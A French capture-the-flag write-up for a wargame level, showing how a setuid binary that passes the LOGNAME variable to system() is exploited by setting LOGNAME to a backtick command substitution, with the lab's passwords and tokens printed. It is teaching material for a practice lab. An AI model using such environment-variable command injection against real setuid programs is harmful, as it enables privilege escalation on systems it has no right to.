# Level07: Exploit variable d'environnement

> login:password -> *`level07:wiok45aaoguiboiki2tuin6ub`*
```
:~$ su level07
Password:wiok45aaoguiboiki2tuin6ub
```
---

```
:~$ pwd
/home/user/level07
```

```
:~$ ls -la
...
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
...
```

Le Home contient un binaire :

```
:~$ ./level07
level07

```

On remarque que le binaire semble afficher son propre nom, mais en utilisant la commande `strings level07`

```
...
getenv
system
LOGNAME
/bin/echo %s
...
```

Si on fait plus attention aux variables d'environnement, on remarque que la variable LOGNAME pourrait nous être utile. Dans un premier temps, essayons de la modifier

```
:~$ export LOGNAME=test
:~$ ./level07
test
```

On constate alors que le binaire affiche la variable LOGNAME. On peux alors essayer de lui faire exécuter la commande `getflag`


```
:~$ export LOGNAME=\`/bin/getflag\`

:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

Le flag nous permet de se connecter au level08
`level08:fiumuikeil55xe9cu4dood66h`